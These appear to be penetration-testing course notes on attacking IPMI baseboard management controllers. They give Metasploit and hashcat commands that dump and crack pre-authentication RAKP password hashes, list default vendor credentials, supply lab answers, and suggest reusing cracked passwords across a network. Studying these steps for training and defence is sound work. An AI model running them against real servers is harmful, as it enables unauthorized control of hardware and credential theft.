# NOTE — IPMI

## ID
600

## Module
Footprinting

## Kind
notes

## Title
Section 16 — IPMI

## Description
Baseboard Management Controllers (BMCs) speak IPMI on UDP/623. The IPMI 2.0 RAKP authentication leaks the SHA1/MD5 hash of any valid user — extract with Metasploit `ipmi_dumphashes` and crack with Hashcat mode 7300.

## Tags
ipmi, bmc, hp-ilo, dell-idrac, supermicro, rakp, hashcat-7300, default-credentials, oob-management

## Commands
- `sudo nmap -sU --script ipmi-version -p 623 <IP>` — version probe
- Metasploit: `use auxiliary/scanner/ipmi/ipmi_version; set rhosts <IP>; run`
- Metasploit: `use auxiliary/scanner/ipmi/ipmi_dumphashes; set rhosts <IP>; run`
- Hashcat: `hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt` (RAKP hash + dictionary)
- Hashcat: `hashcat -m 7300 -w 3 -O "<hash>" /usr/share/wordlists/rockyou.txt`
- Hashcat (HP iLO factory default mask): `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`

## Concept Overview
**IPMI** = Intelligent Platform Management Interface. Out-of-band hardware management — control a server even when it's powered off. Implemented by **Baseboard Management Controllers (BMCs)** = embedded ARM Linux on the motherboard, with its own NIC + IP. Independent of the host OS. Used pre-OS (BIOS edits), powered-off (remote power-on), and post-failure (KVM-over-IP, virtual media).

### Vendor Implementations You'll See
| Vendor | Product |
|--------|---------|
| HP | iLO (Integrated Lights-Out) |
| Dell | iDRAC (integrated Dell Remote Access Controller) |
| Supermicro | IPMI / IPMIView |
| Lenovo | XClarity |
| Cisco | CIMC |

A BMC = "physical access via network." Web console, SSH/Telnet for serial-over-LAN, and the IPMI protocol on UDP/623.

### Components
| Component | Role |
|-----------|------|
| **BMC** | Microcontroller — the brain |
| **ICMB** | Chassis-to-chassis bus |
| **IPMB** | Extends the BMC internally |
| **IPMI Memory** | System event log + sensor data store |
| **Comm interfaces** | Local serial, LAN, ICMB, PCI Mgmt Bus |

## Default / Vendor Credentials (try always)
| Product | Username | Password |
|---------|----------|----------|
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | Random 8-char string (digits + uppercase letters), printed on a tag |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

## Methodology
1. **Discover** — `nmap -sU --script ipmi-version -p 623 <IP>` or Metasploit `ipmi_version`. Confirms version (1.5 vs 2.0) + auth modes.
2. **Try defaults** — even modern installs leave them. iLO password tags get lost.
3. **If defaults fail → dump hashes** — Metasploit `ipmi_dumphashes` exploits the RAKP design flaw: server sends a salted SHA1/MD5 hash of *any valid username*'s password as part of the auth handshake. **No login needed** to extract it.
4. **Crack offline** — Hashcat mode `7300` (IPMI2 RAKP). Try wordlists first, then masks (HP iLO factory default = 8 chars upper+digit).
5. **Use the cracked password** to log into the BMC web console / SSH / IPMIview — game over for the underlying server.

## RAKP Hash Disclosure — The Core Flaw
IPMI 2.0 spec **requires** the server to send a salted hash of the user's password during the authentication handshake. This was designed for HMAC challenge-response, but it means: **anyone who can reach UDP/623 can request the hash for any valid username and crack it offline.**

There is **no fix** — it's part of the spec. Mitigations are:
- Strong, long passwords (12+ chars, full charset) — slows offline cracking dramatically.
- Network segment the BMC interface — never expose it to user VLANs or the internet.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Username configured for IPMI access | **`admin`** | Metasploit: `use auxiliary/scanner/ipmi/ipmi_dumphashes; set rhosts <IP>; run` → output line `Hash found: admin:93c887ae...` |
| Q2 — Cleartext password | **`trinity`** | Crack the dumped RAKP hash: `hashcat -m 7300 -w 3 -O "<full-hash-line>" /usr/share/wordlists/rockyou.txt` → `:trinity` |

### Reference commands
```bash
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts <IP>
run
# copy the full hash line from the [+] output

hashcat -m 7300 -w 3 -O "<paste hash here>" /usr/share/wordlists/rockyou.txt
```

## Key Takeaways
- **IPMI is internal-pentest gold** — almost every server has it, almost no one rotates passwords on it.
- The RAKP hash extraction is **pre-auth** — you don't need any creds, just network reach to UDP/623.
- Hashcat mode is **`7300`** — burn this into memory.
- Cracked BMC passwords often = **password reuse on the host OS** (root SSH, AD service accounts). Always test the password elsewhere on the network.
- A compromised BMC = full physical-equivalent control: power cycle, mount virtual media (boot a Kali ISO), KVM-over-IP, modify BIOS, install rootkits.

## Gotchas
- `ipmi_dumphashes` includes a built-in wordlist — when it says "matches password X", it's auto-cracked one of the dumped hashes. Read the output carefully.
- Mode 7300 is for IPMI 2.0 RAKP. Older IPMI 1.5 won't dump in this format.
- Some BMCs disable RAKP entirely or restrict it to specific source IPs — non-default config that breaks the attack.
- BMCs sometimes ship with hardcoded backdoor accounts (`anonymous`/empty, vendor-debug accounts) — check each vendor's known-issue list.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|footprinting]]
← [[15-oracle-tns]] | [[17-linux-remote-mgmt]] →
<!-- AUTO-LINKS-END -->
